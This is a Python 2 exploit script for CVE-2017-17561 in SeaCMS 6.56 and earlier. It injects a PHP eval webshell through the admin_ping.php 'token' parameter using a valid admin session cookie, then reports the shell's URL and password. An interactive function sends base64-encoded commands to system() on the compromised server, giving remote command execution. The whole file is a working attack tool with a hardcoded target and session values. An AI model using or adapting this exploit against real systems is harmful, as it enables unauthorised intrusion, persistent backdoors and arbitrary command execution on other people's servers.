#!/usr/bin/env python
# -*- coding: utf-8 -*-

import requests

def exploit(config):
    host = config["remote_host"]["default"]
    port = config["remote_port"]["default"]
    admin_path = config["admin_path"]["default"]
    # session_auth = config["session_auth"]["default"]
    session_id = config["session_id"]["default"]
    # username = config["username"]["default"]
    # password = config["password"]["default"]
    webshell_password = config["webshell_pwd"]["default"]
    webshell = config["webshell"]["default"].replace("__PASSWORD__", webshell_password)
    url = "http://%s:%d/%s/admin_ping.php?action=set" % (host, port, admin_path)
    data = {
        "weburl":"www.seacms.net",
        "token":"123456789\";$var=%s.\"" % (webshell)
    }
    cookies = {
        "PHPSESSID":session_id
    }
    print "Data: %s" % (data)
    print "Session: %s" % (cookies)
    response = requests.post(url, data=data, cookies=cookies)
    webshell_url = "http://%s:%d/data/%s/ping.php" % (host, port, admin_path)
    if response.status_code == 200:
        print "Exploit success!"
        print "Webshell is stored at: %s" % (webshell_url)
        print "Password is %s" % (webshell_password)
        return (True, webshell_url, webshell_password)
    else:
        return (False, "Exploit failed!")

def show_options(config):
    print "Options\t\tNecessity\t\tDefault"
    print "-------\t\t---------\t\t-------"
    for key in sorted(config.keys()):
        print "%s\t%s\t\t\t%s" % (key, config[key]["necessity"], config[key]["default"])

def set_config(config, key, value):
    config[key]["default"] = value

def interactive(url, password):
    while True:
        command = raw_input("$ ")
        if command == "exit":
            break
        data = {
            password:"system(base64_decode('%s'));" % (command.encode("base64").replace("\n", ""))
        }
        print requests.post(url, data=data).content

def show_info():
    print "Name: SeaCMS(6.56) Authenticated GetShell (CVE-2017-17561)"
    print "Effected Version: <=6.56"
    print "Author: WangYihang"
    print "Email: wangyihanger@gmail.com"
    print "Refer:"
    print "\thttps://gist.github.com/WangYihang/9507e2efdceb67a5bc2761200f19f213"
    print "\thttps://nvd.nist.gov/vuln/detail/CVE-2017-17561"

def main():
    show_info()
    config = {
        "remote_host": {"default": "127.0.0.1", "necessity":True},
        "remote_port": {"default": 80, "necessity":True},
        "admin_path": {"default": "admin", "necessity":True},
        # "session_auth": {"default": True, "necessity":True},
        "session_id": {"default": "", "necessity":False},
        # "admin_user": {"default": "admin", "necessity":True},
        # "admin_pwd": {"default": "admin", "necessity":True},
        "webshell": {"default": "eval($_REQUEST[__PASSWORD__])", "necessity":True},
        "webshell_pwd":{"default": "c", "necessity":True}
    }
    set_config(config, "remote_host", "192.168.187.1")
    set_config(config, "session_id", "b6aia8tltrqtie7h0pjojelml3")
    show_options(config)
    result = exploit(config)
    '''
    if result[0]:
        url = result[1]
        password = result[2]
        interactive(url, password)
    '''

if __name__ == "__main__":
    main()
